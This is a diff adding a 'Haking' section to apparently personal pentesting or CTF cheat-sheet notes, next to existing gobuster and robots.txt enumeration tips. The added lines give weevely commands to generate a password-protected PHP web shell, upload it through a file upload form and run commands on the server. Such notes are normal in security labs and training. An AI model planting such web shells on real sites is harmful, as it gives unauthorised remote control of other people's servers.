@@ -38,3 +38,28 @@ gobuster dir -u [http://<ip>:<port> or domain] -w <word list location>
 ```
 recomendet wordlist https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/big.txt
 - Look in /robots.txt
+
+## Haking
+File Upload
+Can use Metasploit to generate a payload or use weevely
+```
+weevely generate [password] /kali/paht/to/save/shell.php
+upload 
+weevely [http://pathinthewebsite/shell.php] [password]
+weevely> uname -a
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
